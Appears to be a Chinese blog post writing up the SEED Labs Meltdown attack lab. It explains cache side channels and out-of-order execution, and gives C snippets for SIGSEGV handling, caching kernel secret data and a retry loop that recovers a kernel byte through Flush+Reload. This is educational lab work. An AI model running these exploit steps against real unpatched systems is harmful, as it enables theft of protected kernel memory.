@@ -1,0 +1,861 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/image/atom1.png">
+  <link rel="icon" href="/image/atom1.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#153b6e">
+  <meta name="author" content="郭佳明">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Lab Environment 熔断漏洞是英特尔 CPU 内部的一个缺陷，对 AMD 机器无效 熔断和幽灵攻击都使用 CPU 缓存作为侧通道窃取受保护的信息 seed预先构建的虚拟机提供了环境，因此我们需要在 Ubuntu 16.04 VM以完成实验，注意不要更新虚拟机的操作系统 使用gcc -march&#x3D;native -o myprog myprog.c命令去编译程序，这里-march&#x3D;nati">
+<meta property="og:type" content="article">
+<meta property="og:title" content="seedlab：Meltdown Attack Lab">
+<meta property="og:url" content="http://gls.show/p/a6055774/index.html">
+<meta property="og:site_name" content="郭佳明的博客">
+<meta property="og:description" content="Lab Environment 熔断漏洞是英特尔 CPU 内部的一个缺陷，对 AMD 机器无效 熔断和幽灵攻击都使用 CPU 缓存作为侧通道窃取受保护的信息 seed预先构建的虚拟机提供了环境，因此我们需要在 Ubuntu 16.04 VM以完成实验，注意不要更新虚拟机的操作系统 使用gcc -march&#x3D;native -o myprog myprog.c命令去编译程序，这里-march&#x3D;nati">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://gls.show/image/meltdown-and-spectre.png">
+<meta property="article:published_time" content="2023-03-27T09:42:32.076Z">
+<meta property="article:modified_time" content="2023-03-27T09:43:42.176Z">
+<meta property="article:author" content="郭佳明">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://gls.show/image/meltdown-and-spectre.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>seedlab：Meltdown Attack Lab - 郭佳明的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"gls.show","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>郭佳明的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/mountain1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="seedlab：Meltdown Attack Lab"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-03-27 17:42" pubdate>
+          2023年3月27日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          5.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">seedlab：Meltdown Attack Lab</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2023年3月27日 下午
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="Lab-Environment"><a href="#Lab-Environment" class="headerlink" title="Lab Environment"></a>Lab Environment</h1><ul>
+<li>熔断漏洞是英特尔 CPU 内部的一个缺陷，对 AMD 机器无效</li>
+<li>熔断和幽灵攻击都使用 CPU 缓存作为侧通道窃取受保护的信息</li>
+<li>seed预先构建的虚拟机提供了环境，因此我们需要在 Ubuntu 16.04 VM以完成实验，注意不要更新虚拟机的操作系统</li>
+<li>使用<code>gcc -march=native -o myprog myprog.c</code>命令去编译程序，这里-march=native表示启用本地机器支持的所有指令子集</li>
+</ul>
+<h1 id="Task-1-Reading-from-Cache-versus-from-Memory"><a href="#Task-1-Reading-from-Cache-versus-from-Memory" class="headerlink" title="Task 1: Reading from Cache versus from Memory"></a>Task 1: Reading from Cache versus from Memory</h1><p>多次运行，观察发现每次<code>[3*4096]</code>和<code>[7*4096]</code>的CPU cycles都是最少的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230124101340.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Task-2-Using-Cache-as-a-Side-Channel"><a href="#Task-2-Using-Cache-as-a-Side-Channel" class="headerlink" title="Task 2: Using Cache as a Side Channel"></a>Task 2: Using Cache as a Side Channel</h1><ul>
+<li>secret是一个一字节的秘密值，我们通过cache的侧信道攻击方式猜出该值</li>
+<li>一字节一共有256种可能，我们可以构造出大小为256*4096+1024的数组，由于访问过[secret*4096 + 1024]之后，该值会被cache，因此可以通过循环的方式依次访问[i]*4096+1024，使用时间最短的i就是被cache的secret值<ul>
+<li>之所以使用4096，是因为它比典型的缓存块大(64字节) ，缓存是在块级别完成的，而不是在字节级别，因此定义一个包含256个元素的数组(即 array [256])是行不通的</li>
+<li>之所以使用1024，是因为[0 * 4096]可能与相邻内存中的变量位于相同的缓存块中，为了避免与变量cache到相同的块中，[i*4096]需要加上1024的偏移</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230124151051.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Task-3-Place-Secret-Data-in-Kernel-Space"><a href="#Task-3-Place-Secret-Data-in-Kernel-Space" class="headerlink" title="Task 3: Place Secret Data in Kernel Space"></a>Task 3: Place Secret Data in Kernel Space</h1><p>MeltdownKernel.c使用一个内核模块来存储秘密数据</p>
+<p>编译、安装内核模块，使用 dmesg 命令从内核消息缓冲区中查找秘密数据的地址secret data address：0xf9dcd000</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230128174009.png" srcset="/img/loading.gif" lazyload></p>
+<p>用户级程序调用内核模块中的函数。此函数将访问机密数据，而不会将其泄露给用户级程序。这种访问的副作用是秘密数据现在位于 CPU 缓存中</p>
+<h1 id="Task-4-Access-Kernel-Memory-from-User-Space"><a href="#Task-4-Access-Kernel-Memory-from-User-Space" class="headerlink" title="Task 4: Access Kernel Memory from User Space"></a>Task 4: Access Kernel Memory from User Space</h1><p>由于用户空间程序无法直接访问内核地址的数据，因此会导致segment fault</p>
+<blockquote>
+<p>访问被禁止的内存位置将发出 SIGSEGV 信号; 如果程序不自己处理这个异常，操作系统将处理它并终止程序。这就是程序崩溃的原因</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230128194724.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Task-5-Handle-Error-Exceptions-in-C"><a href="#Task-5-Handle-Error-Exceptions-in-C" class="headerlink" title="Task 5: Handle Error/Exceptions in C"></a>Task 5: Handle Error/Exceptions in C</h1><p>为了避免task4中的segment fault，我们可以在程序中定义我们自己的信号处理程序来捕获由错误事件引发的异常，从而防止程序因错误事件而崩溃。访问被禁止的内存位置将发出 SIGSEGV 信号</p>
+<p>与 C + + 或其他高级语言不同，C 不直接支持错误处理(也称为异常处理) ，例如 try/catch 子句。但是，我们可以使用 sigsetjmp ()和 siglongjmp()来模拟 try/catch 子句</p>
+<p>关于代码的几点注释：</p>
+<ul>
+<li><strong>setjmp</strong>() saves the stack context/environment in <em>env</em>，<strong>sigsetjmp</strong>() is similar to <strong>setjmp</strong>(). If, and only if, <em>savesigs</em> is nonzero, the process’s current signal mask is saved in <em>env</em> and will be restored if a <strong><a target="_blank" rel="noopener" href="https://linux.die.net/man/3/siglongjmp">siglongjmp</a></strong>(3) is later performed with this <em>env</em>。如果希望可移植地保存和恢复信号掩码，使用 sigsetjmp ()和 siglongjmp (3)</li>
+<li>设置信号处理：signal(SIGSEGV, catch_segv)注册一个 SIGSEGV 信号处理程序，这样当一个 SIGSEGV 信号被引发时，处理程序函数 catch Segv ()将被调用</li>
+<li>设置检查点：在信号处理程序完成对异常的处理之后，它需要让程序从特定的检查点继续执行。因此，我们需要首先定义一个检查点。使用 sigsetjmp ()实现的: sigsetjmp (jbuf，1)将堆栈上下文/环境保存在 jbuf 中，以供 siglongjmp ()稍后使用。参考：<a target="_blank" rel="noopener" href="https://pubs.opengroup.org/onlinepubs/7908799/xsh/sigsetjmp.html">https://pubs.opengroup.org/onlinepubs/7908799/xsh/sigsetjmp.html</a></li>
+<li>roll back到一个检查点: 当调用 siglongjmp (jbuf，1)时，保存在 jbuf 变量中的状态被复制回处理器，计算从 sigsetjmp ()函数的返回点开始，但是 sigsetjmp ()函数的返回值是 siglongjmp ()函数的第二个参数，在我们的例子中是1。因此，在异常处理之后，程序继续从 else 分支执行</li>
+<li>触发异常: <code>char kernel_data = *(char*)kernel_data_addr; </code>处的代码将触发一个 SIGSEGV 信号，这是由于内存访问冲突(用户级程序不能访问内核内存)</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;setjmp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">setjmp</span><span class="hljs-params">(jmp_buf env)</span></span>; <span class="hljs-comment">//参数env为用来保存目前堆栈环境</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigsetjmp</span><span class="hljs-params">(sigjmp_buf env, <span class="hljs-keyword">int</span> savesigs)</span></span>; <br><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;setjmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-keyword">static</span> sigjmp_buf jbuf;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">catch_segv</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// Roll back to the checkpoint set by sigsetjmp().</span><br>  siglongjmp(jbuf, <span class="hljs-number">1</span>);                         <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123; <br>  <span class="hljs-comment">// The address of our secret data</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> kernel_data_addr = <span class="hljs-number">0xfb61b000</span>;<br><br>  <span class="hljs-comment">// Register a signal handler</span><br>  signal(SIGSEGV, catch_segv);                     <br><br>  <span class="hljs-comment">//setjmp() and sigsetjmp() return 0 if returning directly</span><br>  <span class="hljs-keyword">if</span> (sigsetjmp(jbuf, <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &#123;	               <br>     <span class="hljs-comment">// A SIGSEGV signal will be raised. </span><br>     <span class="hljs-keyword">char</span> kernel_data = *(<span class="hljs-keyword">char</span>*)kernel_data_addr; <br><br>     <span class="hljs-comment">// The following statement will not be executed.</span><br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Kernel data at address %lu is: %c\n&quot;</span>, <br>                    kernel_data_addr, kernel_data);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory access violation!\n&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program continues to execute.\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>运行后输出：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Memory <span class="hljs-keyword">access</span> violation!<br>Program continues <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span>.<br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-6-Out-of-Order-Execution-by-CPU"><a href="#Task-6-Out-of-Order-Execution-by-CPU" class="headerlink" title="Task 6: Out-of-Order Execution by CPU"></a>Task 6: Out-of-Order Execution by CPU</h1><p>这个任务是为了验证乱序执行的存在</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> number = <span class="hljs-number">0</span>;<br><span class="hljs-number">2</span> kernel_address = (<span class="hljs-keyword">char</span>*)<span class="hljs-number">0xfb61b000</span>;<br><span class="hljs-number">3</span> kernel_data = *kernel_address;	<span class="hljs-comment">//涉及两个操作: 加载数据(通常加载到寄存器中) ，以及检查是否允许数据访问</span><br><span class="hljs-number">4</span> number = number + kernel_data;<br></code></pre></td></tr></table></figure>
+
+<p>对于如上语句，第3行将引发一个异常，因为地址为0xfb61b000的内存属于内核。因此，执行将在第3行被中断，而第4行将永远不会被执行，所以数字变量的值仍然是0</p>
+<p>然而，现代高性能 CPU 不再严格按照指令的原始顺序执行指令，而是允许乱序执行耗尽所有的执行单元。第3行涉及两个操作: 加载数据(通常加载到寄存器中) ，以及检查是否允许数据访问。<strong>如果数据已经在 CPU 缓存中，那么第一个操作将非常快，而第二个操作可能需要一段时间。为了避免等待，CPU 将继续执行第4行和后续指令，同时并行执行访问检查</strong>。这是乱序执行。在访问检查完成之前，不会提交执行结果。由于访问了内核数据，检查失败了，因此由乱序执行引起的所有结果都将被丢弃，就像从未发生过一样。这就是为什么从外面我们看不到第四行被执行的原因</p>
+<p><code>meltdown(0xfb61b000); </code>语句调用了meltdown函数，尽管该函数内的非法内存访问会导致异常，但是下一条语句，也即是<code>array[7 * 4096 + DELTA] += 1;</code>由于CPU乱序执行机制仍然会运行，从而将7纳入cache，之后我们调用reloadSideChannel可以得出秘密值是7</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230129200746.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Task-7-The-Basic-Meltdown-Attack"><a href="#Task-7-The-Basic-Meltdown-Attack" class="headerlink" title="Task 7: The Basic Meltdown Attack"></a>Task 7: The Basic Meltdown Attack</h1><h2 id="Task-7-1-A-Naive-Approach"><a href="#Task-7-1-A-Naive-Approach" class="headerlink" title="Task 7.1: A Naive Approach"></a>Task 7.1: A Naive Approach</h2><p>显示 Memory access violation</p>
+<h2 id="Task-7-2-Improve-the-Attack-by-Getting-the-Secret-Data-Cached"><a href="#Task-7-2-Improve-the-Attack-by-Getting-the-Secret-Data-Cached" class="headerlink" title="Task 7.2: Improve the Attack by Getting the Secret Data Cached"></a>Task 7.2: Improve the Attack by Getting the Secret Data Cached</h2><p>熔断漏洞是一个竞争条件的漏洞，其中包括竞争条件之间的乱序执行和访问检查。乱序执行越快，我们能执行的指令就越多，我们就越有可能创造出可观察到的效果，帮助我们得到秘密数据</p>
+<p>在我们的代码中，乱序执行的第一步是将内核数据加载到一个寄存器中。同时，对这样的访问执行安全检查。如果数据加载慢于安全检查，也就是说，当安全检查完成时，因为访问检查失败，内核数据仍然在从内存到寄存器的路上，乱序执行会立即中断并丢弃。我们的攻击也会失败</p>
+<p>在这里可以先访问/proc/secret_data，使其在CPU cache中，这样可以加快数据加载的速度，从而利用竞态漏洞，在安全检查结束之前获得信息</p>
+<p>在flushsidechannel后添加：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Open the /proc/secret_data virtual file.</span><br><span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/secret_data&quot;</span>, O_RDONLY);<br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;open&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">int</span> ret = pread(fd, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// Cause the secret data to be cached.</span><br></code></pre></td></tr></table></figure>
+
+<p>依旧显示 Memory access violation</p>
+<h2 id="Task-7-3-Using-Assembly-Code-to-Trigger-Meltdown"><a href="#Task-7-3-Using-Assembly-Code-to-Trigger-Meltdown" class="headerlink" title="Task 7.3: Using Assembly Code to Trigger Meltdown"></a>Task 7.3: Using Assembly Code to Trigger Meltdown</h2><p>通过在内核内存访问之前添加几行汇编指令再做一次改进，关于汇编的写法，这里有一个参考<a target="_blank" rel="noopener" href="https://meltdownattack.com/meltdown.pdf">https://meltdownattack.com/meltdown.pdf</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230130204216.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Task-8-Make-the-Attack-More-Practical"><a href="#Task-8-Make-the-Attack-More-Practical" class="headerlink" title="Task 8: Make the Attack More Practical"></a>Task 8: Make the Attack More Practical</h1><p>加一层循环即可</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k=<span class="hljs-number">0</span>;k&lt;<span class="hljs-number">8</span>;k++)<br>&#123;<br>	  <span class="hljs-built_in">memset</span>(scores, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(scores));<br>	  flushSideChannel();<br>	  <br>		  <br>	  <span class="hljs-comment">// Retry 1000 times on the same address.</span><br>	  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>		ret = pread(fd, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>		<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>		  perror(<span class="hljs-string">&quot;pread&quot;</span>);<br>		  <span class="hljs-keyword">break</span>;<br>		&#125;<br>		<br>		<span class="hljs-comment">// Flush the probing array</span><br>		<span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">256</span>; j++) <br>			_mm_clflush(&amp;<span class="hljs-built_in">array</span>[j * <span class="hljs-number">4096</span> + DELTA]);<br><br>		<span class="hljs-keyword">if</span> (sigsetjmp(jbuf, <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &#123; meltdown_asm(<span class="hljs-number">0xfb61b000</span>); &#125;<br><br>		reloadSideChannelImproved();<br>	  &#125;<br><br>	  <span class="hljs-comment">// Find the index with the highest score.</span><br>	  <span class="hljs-keyword">int</span> max = <span class="hljs-number">0</span>;<br>	  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>		<span class="hljs-keyword">if</span> (scores[max] &lt; scores[i]) max = i;<br>	  &#125;<br><br>	  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret value is %d %c\n&quot;</span>, max, max);<br>	  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>得到秘密信息：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image-20230131165829797.png" srcset="/img/loading.gif" lazyload></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/SEED-lab/" class="category-chain-item">SEED-lab</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>seedlab：Meltdown Attack Lab</div>
+      <div>http://gls.show/p/a6055774/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>郭佳明</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年3月27日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/p/634ccbb5/" title="R语言入门">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">R语言入门</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/p/bdeaa012/" title="buuctf-pwn刷题记录">
+                        <span class="hidden-mobile">buuctf-pwn刷题记录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'LaPhilosophie/gls.show');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
